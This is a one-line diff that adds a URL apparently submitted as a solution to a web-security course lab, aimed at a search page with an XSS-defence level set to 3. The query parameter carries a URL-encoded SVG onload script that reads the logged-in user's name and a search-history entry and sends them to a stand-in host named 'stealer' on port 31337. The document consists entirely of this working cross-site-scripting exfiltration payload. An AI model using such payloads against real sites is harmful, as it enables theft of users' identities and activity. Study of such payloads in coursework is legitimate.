@@ -1,0 +1,1 @@
+https://webproject.gtinfosec.org/search?xssdefense=3&q=%3Csvg%20onload%3D%24.get(%60http%3A%2F%2Fstealer%3A31337%2F%3Fstolen_user%3D%60%2BencodeURIComponent(document.getElementById(%60logged-in-user%60).textContent)%2B%60%26last_search%3D%60%2BencodeURIComponent(document.getElementById(%60history-list%60).children%5B1%5D.textContent))%3E
